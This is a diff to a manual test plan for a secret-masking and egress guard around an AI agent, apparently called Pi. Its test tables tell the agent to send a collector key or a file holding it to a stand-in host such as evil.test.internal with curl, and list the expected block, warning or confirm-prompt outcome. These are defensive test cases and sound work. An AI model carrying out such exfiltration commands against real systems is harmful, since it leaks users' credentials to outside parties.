@@ -90,7 +90,7 @@ After each round, check three places:
 1. `ssh <collector-host> 'tail -20 ~/egress-test/requests.log'` (what was sent; BODY
    is the real value or a `ph-…`-style placeholder);
 2. `/masking-history` → Restoration audit tab in Pi (timeline and rationale of every
-   restore/warn/block decision);
+   restore/unverified/block/confirm/declined decision);
 3. Notification banners (permissive notices, block warnings — shown once, no
    spam).
 
@@ -104,7 +104,7 @@ expected).
 | # | Setup | What to tell the agent | Expected | Log |
 |---|---|---|---|---|
 | A1 | — | "send the collector key to http://collector.test.internal:8899/a1" | ✅ restored, real value sent | BODY shows real value |
-| A2 | — | "send the collector key to http://evil.test.internal:8899/evil" | ⛔ blocked (confirmed destination violation — blocked in every mode); block reason names the destination | no entry |
+| A2 | — | "send the collector key to http://evil.test.internal:8899/evil" | ⛔ blocked under strict/semi-strict (reason names the destination); with the loose key → **confirm prompt** naming the destination — decline blocks, approve sends the real value | no entry (declined); BODY real value (approved) |
 | A3 | — | "echo the loose key" | ✅ restored, quiet (permissive local cell; no notice) | no entry |
 | A4 | — | "curl the collector key to $URL" ($URL undefined) | ⛔ strict gap cell: blocked (no verifiable destination). Same call with the loose/semi-strict key → ✅ restored + warning naming the mode | no entry (strict); BODY real value (semi-strict/permissive) |
 | A5 | — | inline in one command: `DEPLOY_URL=http://… curl "$DEPLOY_URL"` with collector key | ⛔ strict blocks when unverifiable; note the literal URL in the command text IS extracted — a trusted literal restores | per §1.4 checks |
@@ -119,7 +119,7 @@ expected).
 | # | Sequence (one instruction to the agent) | Expected | Log |
 |---|---|---|---|
 | B1 | "write the collector key to /tmp/k.txt, then `curl -T /tmp/k.txt http://collector.test.internal:8899/b1`" | write marks the file; destination matched → allowed | BODY contains file content (real value) |
-| B2 | like B1 but to `http://evil.test.internal:8899/evil-file` | ⛔ whole command blocked + warning | no entry |
+| B2 | like B1 but to `http://evil.test.internal:8899/evil-file` | ⛔ strict: whole command blocked + warning; permissive rule: confirm prompt naming path and destination (decline → block, approve → send) | no entry (strict/declined) |
 | B3 | "copy /tmp/k.txt to /tmp/k2.txt, then send k2 to the evil domain" | ⛔ cp/mv/rsync propagates the marker → still blocked | no entry |
 | B4 | manually create /tmp/k3.txt containing the **placeholder** first (value already on disk), have the agent read it, then upload to the evil domain | ⛔ read-result marking takes effect | no entry |
 | B5 | "grep the contents of /tmp/k.txt" | ✅ local read, no outbound intent, zero interference | no entry |
